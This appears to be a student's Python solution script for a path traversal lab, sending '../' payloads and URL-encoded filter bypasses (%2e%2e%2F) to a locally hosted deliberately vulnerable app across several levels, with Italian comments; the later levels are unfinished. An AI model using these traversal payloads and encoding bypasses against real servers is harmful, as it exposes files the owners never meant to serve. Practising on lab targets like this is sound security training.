import requests

s = requests.Session()

#LEVEL 1 the site execute the filename, this is vulnerable to a path traversal attack

url = 'http://127.0.0.1:9090/VulnerableApp/PathTraversal/LEVEL_1'

payload = '../' #UserInfo.json

response = s.get(url , params = {'fileName' : payload} )

#LEVEL 2 

url = 'http://127.0.0.1:9090/VulnerableApp/PathTraversal/LEVEL_2'

payload = '../' #UserInfo.json

response = s.get(url , params = {'fileName' : payload} )

#LEVEL 3

#Scrivi su terminale GET http://127.0.0.1:9090/VulnerableApp/PathTraversal/LEVEL_3\?fileName\=%2e%2e/


url = 'http://127.0.0.1:9090/VulnerableApp/PathTraversal/LEVEL_3'

payload = "../" #UserInfo.json

response = s.get(url , params = {'fileName' : payload} )

#LEVEL 4 the .. and / character as well as %2f, are filtered, so use this url

#scrivi GET http://127.0.0.1:9090/VulnerableApp/PathTraversal/LEVEL_4\?fileName\=%2e%2e%2F


url = 'http://127.0.0.1:9090/VulnerableApp/PathTraversal/LEVEL_4'

#LEVEL 5 

print(response.text)